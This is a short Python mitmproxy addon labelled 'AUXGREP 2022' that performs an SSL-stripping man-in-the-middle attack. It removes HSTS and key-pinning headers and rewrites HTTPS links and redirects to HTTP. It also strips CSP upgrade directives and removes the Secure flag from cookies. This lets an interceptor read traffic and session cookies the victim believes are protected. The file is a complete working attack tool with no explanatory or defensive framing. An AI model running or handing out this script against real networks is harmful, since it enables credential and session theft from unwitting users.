"""
AUXGREP 2022
"""
import re
import urllib.parse
import typing  

from mitmproxy import http


secure_hosts: typing.Set[str] = set()


def request(flow: http.HTTPFlow) -> None:
    flow.request.headers.pop('If-Modified-Since', None)
    flow.request.headers.pop('Cache-Control', None)

    
    flow.request.headers.pop('Upgrade-Insecure-Requests', None)

    
    if flow.request.pretty_host in secure_hosts:
        flow.request.scheme = 'https'
        flow.request.port = 443

        
        flow.request.host = flow.request.pretty_host


def response(flow: http.HTTPFlow) -> None:
    assert flow.response
    flow.response.headers.pop('Strict-Transport-Security', None)
    flow.response.headers.pop('Public-Key-Pins', None)

 
    flow.response.content = flow.response.content.replace(b'https://', b'http://')

    
    csp_meta_tag_pattern = br'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
    flow.response.content = re.sub(csp_meta_tag_pattern, b'', flow.response.content, flags=re.IGNORECASE)


    if flow.response.headers.get('Location', '').startswith('https://'):
        location = flow.response.headers['Location']
        hostname = urllib.parse.urlparse(location).hostname
        if hostname:
            secure_hosts.add(hostname)
        flow.response.headers['Location'] = location.replace('https://', 'http://', 1)

    
    csp_header = flow.response.headers.get('Content-Security-Policy', '')
    if re.search('upgrade-insecure-requests', csp_header, flags=re.IGNORECASE):
        csp = flow.response.headers['Content-Security-Policy']
        new_header = re.sub(r'upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)
        flow.response.headers['Content-Security-Policy'] = new_header

   
    cookies = flow.response.headers.get_all('Set-Cookie')
    cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
    flow.response.headers.set_all('Set-Cookie', cookies)
